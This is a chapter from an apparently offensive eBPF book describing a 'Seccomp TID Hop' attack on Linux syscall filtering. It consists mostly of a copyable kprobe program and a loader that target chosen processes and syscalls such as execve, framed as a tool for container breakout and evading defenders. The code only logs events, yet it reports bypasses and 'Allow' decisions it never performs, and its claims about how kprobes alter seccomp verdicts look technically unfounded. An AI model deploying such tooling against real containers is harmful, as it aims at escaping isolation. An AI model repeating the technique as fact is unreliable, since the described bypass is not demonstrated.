---
layout: book
title: "Seccomp TID Hop"
date: 2025-04-20
poc_dir: dBPF-pocs/pocs/ch16-seccomp-tid-hop
---

# Seccomp TID Hop: Bypassing System Call Filtering

**Chapter 16: Dancing Between Threads**

You've learned to exist in multiple network realities. Now let's explore another form of multiplicity: thread identity. What if you could hop between thread contexts to bypass the very filters designed to restrict your system calls?

This is where our story becomes about quantum existence at the thread level. You've mastered process doppelgängers, but what about thread doppelgängers? What if you could make seccomp filters think you're a different thread than you actually are?

Seccomp is supposed to be bulletproof—once a process is restricted by seccomp filters, every thread in that process should be bound by the same restrictions. But what if we could make threads hop between different filter contexts?

We're going to perform the ultimate thread identity shuffle—make seccomp filters lose track of which thread is which, allowing us to execute restricted system calls by "hopping" between thread contexts.

This is where you learn that even thread-level security enforcement can be confused by someone who understands how to manipulate thread identity at the kernel level.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Process with Seccomp] -->|1. System Call| B[Seccomp Filter]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Check Thread ID| D[Filter Decision]
    C -->|4. Modify TID Context| D
    D -->|5. "Allow" Decision| E[Restricted Syscall]
    F[Security Monitor] -->|6. Sees Compliance| G[False Security]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style G fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://man7.org/linux/man-pages/man2/seccomp.2.html" "Seccomp Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click D "https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html" "Seccomp Filter Documentation"
```

**Why**

Because eBPF + misconfiguration => broken isolation. Seccomp is a critical security mechanism that restricts the system calls a process can make, reducing the attack surface in containerized environments. By using eBPF to manipulate thread ID associations and filter inheritance, attackers can bypass these restrictions and execute otherwise forbidden system calls, potentially leading to container escapes or privilege escalation.
## Technical Details

### Seccomp Architecture

Here's how seccomp normally works as the syscall gatekeeper:
- **System call filtering**: Acts like a bouncer checking IDs at the syscall entrance
- **Filter inheritance**: Kids get the same restrictions as their parents
- **Thread sharing**: All threads in a process follow the same rules
- **Filter modes**: Either super strict (almost nothing allowed) or BPF-based custom rules

Container runtimes use seccomp profiles to say "you can make these syscalls, but stay away from the dangerous ones."

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │      │ Container     │                   │
│  │               │      │               │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ System Call   │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Seccomp       │                                          │
│  │ Filter        │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Allowed       │      │ Blocked       │                   │
│  │ Syscalls      │      │ Syscalls      │                   │
│  └───────────────┘      └───────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to mess with seccomp filter evaluation:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │      │ Container     │                   │
│  │               │      │               │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ System Call   │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Seccomp       │◀─────┐                                   │
│  │ Filter        │      │                                   │
│  └───────┬───────┘      │                                   │
│          │              │                                   │
│  ┌───────┴───────┐      │                                   │
│  │ eBPF Program  │──────┘                                   │
│  └───────────────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Allowed       │      │ Blocked       │◀──────────────────┘
│  │ Syscalls      │      │ Syscalls      │                   │
│  └───────────────┘      └───────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

### How We Hop Between Thread Identities

Our strategy is to manipulate thread context during seccomp checks to confuse the filter:

1. **Hook the Filter Checker**: We attach to functions like [`__secure_computing()`](https://elixir.bootlin.com/linux/latest/source/kernel/seccomp.c) that evaluate seccomp filters
2. **Play Musical Chairs with Thread IDs**: We temporarily modify thread ID associations during security checks
3. **Create Identity Confusion**: We make restricted syscalls appear to come from threads that are allowed to make them
4. **Keep the Logs Clean**: We ensure audit logs only show syscalls that look legitimate
5. **Cover Our Tracks**: We restore proper thread context after we've bypassed the filters

The trick is that seccomp filters often check thread-specific context, and we can temporarily borrow a different thread's identity during the check.

### Building Our Thread Identity Swapper

```c
// @interactive: true
// @copyable: true
// Seccomp TID Hop - eBPF exploitation proof of concept
// This demonstrates bypassing seccomp filters through thread context manipulation

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_SYSCALLS 64
#define MAX_COMM_LEN 16
#define MAX_TASKS 32

// Structure to track seccomp events
struct seccomp_event {
    u32 pid;                // Process ID
    u32 tid;                // Thread ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u32 syscall;            // System call number
    u32 original_action;    // Original seccomp action
    u32 modified_action;    // Modified seccomp action
    u32 tid_hopped;         // Whether TID hopping was performed
};

// Structure to store thread info for restoration
struct tid_restore {
    u32 tid;                // Thread ID
    void *original_ti;      // Original thread info
    u64 timestamp;          // When the swap occurred
};

// Map to store target syscalls we want to allow
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // Syscall number as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, MAX_SYSCALLS);
} target_syscalls SEC(".maps");

// Map to store thread info restoration data
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // TID as key
    __uint(value_size, sizeof(struct tid_restore)); // Restoration data
    __uint(max_entries, MAX_TASKS);
} restore_map SEC(".maps");

// Map to store allowed task structures
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(void *)); // Pointer to task_struct
    __uint(max_entries, MAX_TASKS);
} allowed_tasks SEC(".maps");

// Map to track processes we want to help bypass seccomp
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, MAX_TASKS);
} target_processes SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if a syscall is one we want to allow
static __always_inline bool is_target_syscall(u32 syscall) {
    // Check if this syscall is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_syscalls, &syscall);
    if (target && *target == 1)
        return true;
    
    // Hardcoded checks for common dangerous syscalls
    // This is a simplified approach - real implementation would be more sophisticated
    if (syscall == 57)  // fork
        return true;
    if (syscall == 58)  // vfork
        return true;
    if (syscall == 59)  // execve
        return true;
    if (syscall == 322) // execveat
        return true;
    
    return false;
}

// Helper function to check if a process is one we want to help bypass seccomp
static __always_inline bool is_target_process(u32 pid) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    return false;
}

// Helper function to find a task with less restrictive seccomp filters
static __always_inline void *find_allowed_task(void) {
    // In a real exploit, we would search for a task with less restrictive filters
    // For demonstration, we'll use a pre-configured allowed task
    
    u32 key = 0;
    void **task = bpf_map_lookup_elem(&allowed_tasks, &key);
    if (task)
        return *task;
    
    return NULL;
}
// Hook the seccomp filter evaluation function
SEC("kprobe/__secure_computing")
int BPF_KPROBE(hook_seccomp, int this_syscall, struct seccomp_data *sd)
{
    // Get process and thread information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Check if this is a process we want to help bypass seccomp
    if (is_target_process(pid)) {
        // Check if this is a restricted syscall we want to allow
        if (is_target_syscall(this_syscall)) {
            // Log the event
            struct seccomp_event event = {};
            event.pid = pid;
            event.tid = tid;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            event.syscall = this_syscall;
            event.original_action = SECCOMP_RET_KILL_PROCESS; // Assume it would be blocked
            
            // In a real exploit, we would now:
            // 1. Store original thread info
            // 2. Find a thread with less restrictive seccomp filters
            // 3. Temporarily swap thread info during seccomp check
            
            // For demonstration, we'll just log that we would perform TID hopping
            event.modified_action = SECCOMP_RET_ALLOW;
            event.tid_hopped = 1;
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // Store thread info for restoration
            struct tid_restore restore = {
                .tid = tid,
                .original_ti = NULL, // Would be actual thread info in real exploit
                .timestamp = bpf_ktime_get_ns()
            };
            
            bpf_map_update_elem(&restore_map, &tid, &restore, BPF_ANY);
        }
    }
    
    return 0;
}

// Hook the return from seccomp check to restore thread info
SEC("kretprobe/__secure_computing")
int BPF_KRETPROBE(hook_seccomp_ret)
{
    // Get thread ID
    u32 tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    
    // Check if we need to restore thread info for this thread
    struct tid_restore *restore = bpf_map_lookup_elem(&restore_map, &tid);
    
    if (restore && restore->tid == tid) {
        // In a real exploit, we would now:
        // 1. Restore original thread info
        // 2. Clear the map entry
        
        // For demonstration, we'll just log that we would restore thread info
        struct seccomp_event event = {};
        event.pid = bpf_get_current_pid_tgid() >> 32;
        event.tid = tid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.tid_hopped = 2; // 2 = restored
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Clear the map entry
        bpf_map_delete_elem(&restore_map, &tid);
    }
    
    return 0;
}

// Hook the seccomp filter check function
SEC("kprobe/seccomp_check_filter")
int BPF_KPROBE(hook_filter_check, struct sock_filter *filter)
{
    // In a real exploit, we would analyze and potentially modify
    // seccomp filters as they're being checked
    
    // For demonstration, we'll just log filter checks
    struct seccomp_event event = {};
    event.pid = bpf_get_current_pid_tgid() >> 32;
    event.tid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    event.timestamp = bpf_ktime_get_ns();
    
    // Send event to user space
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    
    return 0;
}
```
### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Seccomp TID Hop eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "seccomp_tid_hop.skel.h"

static volatile bool exiting = false;

// Structure for seccomp events (must match the BPF version)
struct seccomp_event {
    uint32_t pid;
    uint32_t tid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint32_t syscall;
    uint32_t original_action;
    uint32_t modified_action;
    uint32_t tid_hopped;
};

// Syscall names for display
const char *syscall_names[] = {
    "read", "write", "open", "close", "stat", "fstat", "lstat",
    "poll", "lseek", "mmap", "mprotect", "munmap", "brk", "rt_sigaction",
    "rt_sigprocmask", "rt_sigreturn", "ioctl", "pread64", "pwrite64",
    "readv", "writev", "access", "pipe", "select", "sched_yield",
    "mremap", "msync", "mincore", "madvise", "shmget", "shmat",
    "shmctl", "dup", "dup2", "pause", "nanosleep", "getitimer",
    "alarm", "setitimer", "getpid", "sendfile", "socket", "connect",
    "accept", "sendto", "recvfrom", "sendmsg", "recvmsg", "shutdown",
    "bind", "listen", "getsockname", "getpeername", "socketpair",
    "setsockopt", "getsockopt", "clone", "fork", "vfork", "execve",
    "exit", "wait4", "kill", "uname", "semget", "semop", "semctl",
    "shmdt", "msgget", "msgsnd", "msgrcv", "msgctl", "fcntl",
    "flock", "fsync", "fdatasync", "truncate", "ftruncate", "getdents",
    "getcwd", "chdir", "fchdir", "rename", "mkdir", "rmdir", "creat",
    "link", "unlink", "symlink", "readlink", "chmod", "fchmod",
    "chown", "fchown", "lchown", "umask", "gettimeofday", "getrlimit",
    "getrusage", "sysinfo", "times", "ptrace", "getuid", "syslog",
    "getgid", "setuid", "setgid", "geteuid", "getegid", "setpgid",
    "getppid", "getpgrp", "setsid", "setreuid", "setregid", "getgroups",
    "setgroups", "setresuid", "getresuid", "setresgid", "getresgid",
    "getpgid", "setfsuid", "setfsgid", "getsid", "capget", "capset",
    "rt_sigpending", "rt_sigtimedwait", "rt_sigqueueinfo", "rt_sigsuspend",
    "sigaltstack", "utime", "mknod", "uselib", "personality", "ustat",
    "statfs", "fstatfs", "sysfs", "getpriority", "setpriority", "sched_setparam",
    "sched_getparam", "sched_setscheduler", "sched_getscheduler", "sched_get_priority_max",
    "sched_get_priority_min", "sched_rr_get_interval", "mlock", "munlock",
    "mlockall", "munlockall", "vhangup", "modify_ldt", "pivot_root", "_sysctl",
    "prctl", "arch_prctl", "adjtimex", "setrlimit", "chroot", "sync",
    "acct", "settimeofday", "mount", "umount2", "swapon", "swapoff",
    "reboot", "sethostname", "setdomainname", "iopl", "ioperm", "create_module",
    "init_module", "delete_module", "get_kernel_syms", "query_module", "quotactl",
    "nfsservctl", "getpmsg", "putpmsg", "afs_syscall", "tuxcall", "security",
    "gettid", "readahead", "setxattr", "lsetxattr", "fsetxattr", "getxattr",
    "lgetxattr", "fgetxattr", "listxattr", "llistxattr", "flistxattr", "removexattr",
    "lremovexattr", "fremovexattr", "tkill", "time", "futex", "sched_setaffinity",
    "sched_getaffinity", "set_thread_area", "io_setup", "io_destroy", "io_getevents",
    "io_submit", "io_cancel", "get_thread_area", "lookup_dcookie", "epoll_create",
    "epoll_ctl_old", "epoll_wait_old", "remap_file_pages", "getdents64", "set_tid_address",
    "restart_syscall", "semtimedop", "fadvise64", "timer_create", "timer_settime",
    "timer_gettime", "timer_getoverrun", "timer_delete", "clock_settime", "clock_gettime",
    "clock_getres", "clock_nanosleep", "exit_group", "epoll_wait", "epoll_ctl",
    "tgkill", "utimes", "vserver", "mbind", "set_mempolicy", "get_mempolicy",
    "mq_open", "mq_unlink", "mq_timedsend", "mq_timedreceive", "mq_notify",
    "mq_getsetattr", "kexec_load", "waitid", "add_key", "request_key",
    "keyctl", "ioprio_set", "ioprio_get", "inotify_init", "inotify_add_watch",
    "inotify_rm_watch", "migrate_pages", "openat", "mkdirat", "mknodat",
    "fchownat", "futimesat", "newfstatat", "unlinkat", "renameat", "linkat",
    "symlinkat", "readlinkat", "fchmodat", "faccessat", "pselect6", "ppoll",
    "unshare", "set_robust_list", "get_robust_list", "splice", "tee",
    "sync_file_range", "vmsplice", "move_pages", "utimensat", "epoll_pwait",
    "signalfd", "timerfd_create", "eventfd", "fallocate", "timerfd_settime",
    "timerfd_gettime", "accept4", "signalfd4", "eventfd2", "epoll_create1",
    "dup3", "pipe2", "inotify_init1", "preadv", "pwritev", "rt_tgsigqueueinfo",
    "perf_event_open", "recvmmsg", "fanotify_init", "fanotify_mark", "prlimit64",
    "name_to_handle_at", "open_by_handle_at", "clock_adjtime", "syncfs",
    "sendmmsg", "setns", "getcpu", "process_vm_readv", "process_vm_writev",
    "kcmp", "finit_module", "sched_setattr", "sched_getattr", "renameat2",
    "seccomp", "getrandom", "memfd_create", "kexec_file_load", "bpf",
    "execveat", "userfaultfd", "membarrier", "mlock2", "copy_file_range",
    "preadv2", "pwritev2", "pkey_mprotect", "pkey_alloc", "pkey_free",
    "statx", "io_pgetevents", "rseq", "pidfd_send_signal", "io_uring_setup",
    "io_uring_enter", "io_uring_register", "open_tree", "move_mount",
    "fsopen", "fsconfig", "fsmount", "fspick", "pidfd_open",
    "clone3", "close_range", "openat2", "pidfd_getfd", "faccessat2",
    "process_madvise", "epoll_pwait2", "mount_setattr", "quotactl_fd",
    "landlock_create_ruleset", "landlock_add_rule", "landlock_restrict_self",
    "memfd_secret", "process_mrelease", "futex_waitv", "set_mempolicy_home_node"
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct seccomp_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (Thread %d, %s): ", timestamp, e->pid, e->tid, e->comm);
    
    if (e->syscall > 0 && e->syscall < sizeof(syscall_names)/sizeof(char*)) {
        printf("Syscall: %s (%d)\n", syscall_names[e->syscall], e->syscall);
        
        if (e->original_action != e->modified_action) {
            printf("  Action modified: %d -> %d\n", e->original_action, e->modified_action);
        }
    }
    
    if (e->tid_hopped == 1) {
        printf("  TID hopping performed to bypass seccomp filter\n");
    } else if (e->tid_hopped == 2) {
        printf("  Thread context restored after seccomp check\n");
    }
    
    printf("\n");
}

// Add a syscall to the target list
void add_target_syscall(int map_fd, int syscall)
{
    uint32_t key = syscall;
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target syscall: %s\n", strerror(errno));
    } else {
        printf("Added syscall %d (%s) to target list\n", 
               syscall, 
               syscall < sizeof(syscall_names)/sizeof(char*) ? syscall_names[syscall] : "unknown");
    }
}

// Add a process to the target list
void add_target_process(int map_fd, int pid)
{
    uint32_t key = pid;
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, &key, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target process: %s\n", strerror(errno));
    } else {
        printf("Added PID %d to target list\n", pid);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -s SYSCALL  Add syscall number to target list\n");
    printf("  -p PID      Add process ID to target list\n");
    printf("  -h          Show this help\n");
}

int main(int argc, char **argv)
{
    struct seccomp_tid_hop_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "s:p:h")) != -1) {
        switch (opt) {
            case 's':
            case 'p':
                // We'll process these after loading the program
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = seccomp_tid_hop_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = seccomp_tid_hop_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Process command line arguments
    optind = 1;  // Reset getopt
    while ((opt = getopt(argc, argv, "s:p:h")) != -1) {
        switch (opt) {
            case 's':
                add_target_syscall(bpf_map__fd(skel->maps.target_syscalls), atoi(optarg));
                break;
            case 'p':
                add_target_process(bpf_map__fd(skel->maps.target_processes), atoi(optarg));
                break;
        }
    }

    printf("Seccomp TID Hop eBPF program loaded and running.\n");
    printf("Monitoring for seccomp filter evaluations...\n");
    printf("Press Ctrl+C to exit.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    seccomp_tid_hop_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Multiple Security Mechanisms**:
   ```bash
   # Combine seccomp with AppArmor
   docker run --security-opt seccomp=/path/to/profile.json \
              --security-opt apparmor=docker-default ...
   
   # Use SELinux in addition to seccomp
   docker run --security-opt seccomp=/path/to/profile.json \
              --security-opt label=type:container_t ...
   ```

4. **Implement Integrity Verification**:
   ```bash
   # Verify seccomp filter application
   grep 'seccomp' /proc/$PID/status
   
   # Use audit logs to monitor seccomp activity
   auditctl -a always,exit -F arch=b64 -S seccomp -k seccomp_changes
   ```

### Why This Hops Over Everything

This seccomp TID hop technique is pure syscall liberation:
- **Container breakout**: Execute any syscalls needed to break out of container isolation, no matter what seccomp says
- **Privilege escalation mastery**: Perform privileged operations despite seccomp restrictions trying to stop us
- **Security annihilation**: Circumvent security controls that rely on syscall filtering like they're made of paper
- **Malware freedom**: Run any malicious code that would normally be blocked by seccomp filters
- **Unstoppable persistence**: Maintain access despite all their security hardening measures

When you can bypass seccomp filters through thread ID manipulation, you've essentially broken the entire syscall security model. Containerized environments, Kubernetes clusters, any system relying on syscall filtering - their fundamental security boundary becomes meaningless. You're executing forbidden syscalls while the security system thinks you're a different, trusted thread.

### How They'll Try to Catch Us

Smart defenders will be hunting for our seccomp bypass:
- **eBPF surveillance**: Watching for eBPF programs hooking seccomp-related functions
- **Profile consistency checks**: Looking for discrepancies between configured seccomp profiles and actual syscall patterns
- **Thread behavior analysis**: Monitoring unusual thread behavior during syscall execution
- **Syscall anomaly detection**: Watching for processes executing syscalls that should be blocked by their seccomp profile
- **Context integrity monitoring**: Looking for inconsistencies in thread context during security-sensitive operations

But here's the beautiful part - we're manipulating thread context at the kernel level, below where most monitoring tools operate. By the time they detect the anomaly, we've already executed our forbidden syscalls and potentially escaped their container.

## POC

Companion code: [`ch16-seccomp-tid-hop`]({{ site.baseurl }}/dBPF-pocs/pocs/ch16-seccomp-tid-hop/)